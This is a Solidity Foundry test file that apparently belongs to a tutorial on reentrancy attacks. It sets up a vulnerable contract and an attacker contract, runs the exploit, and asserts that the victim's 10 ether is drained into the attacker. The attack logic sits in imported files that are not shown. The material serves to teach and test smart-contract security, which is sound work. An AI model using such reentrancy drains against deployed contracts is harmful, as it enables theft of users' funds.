// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/00-basic.sol";
import "../src/00-template_attacker.sol";

contract ProofOfConcept is Test {

    Vulnerable public victim;
    Attacker public attacker;

    // The setUp() function will be run before each test to set the initial scenario
    function setUp() public {
        // Declaring our contracts
        victim = new Vulnerable();
        attacker = new Attacker(address(victim));
        // Labelling for test traces
        vm.label(address(victim), "victim_contract");         
        vm.label(address(attacker), "attacker_contract");
        // Funding both parties
        vm.deal(address(attacker), 1 ether); // It is not necessary to fund the attacker as you could just send eth along, but still
        vm.deal(address(victim), 10 ether);
    }

    // Foundry tests should start with the word "test" to be recognized as such
    function test_exploit() public {
        console.log(unicode"\n   📚📚 All things reentrancy: basic exploitation\n");
        console.log("--------------------------------------------------------");
        console.log(unicode"| => Victim's balance 🙂 %s 🙂", toEth(address(victim).balance));
        console.log(unicode"| => Attacker's balance 👀 %s 👀", toEth(address(attacker).balance));
        console.log("--------------------------------------------------------"); 

        console.log(unicode"\n\t💥💥💥💥 EXPLOITING... 💥💥💥💥\n"); 

        attacker.exploit();
        
        // Conditions to fullfill
        assertEq(address(victim).balance, 0);
        assertEq(address(attacker).balance, 11 ether);

        console.log("--------------------------------------------------------"); 
        console.log(unicode"| => Victim's balance ☠  %s ☠", toEth(address(victim).balance));
        console.log(unicode"| => Attacker's balance 💯 %s 💯", toEth(address(attacker).balance));
        console.log("--------------------------------------------------------");               
    }


    function toEth(uint256 _wei) internal pure returns (string memory) {
        string memory eth = vm.toString(_wei / 1 ether);
        string memory decs = vm.toString(_wei % 1 ether);

        string memory result = string.concat(
            string.concat(eth, "."),
            decs
        );

        return result;
    }      
}
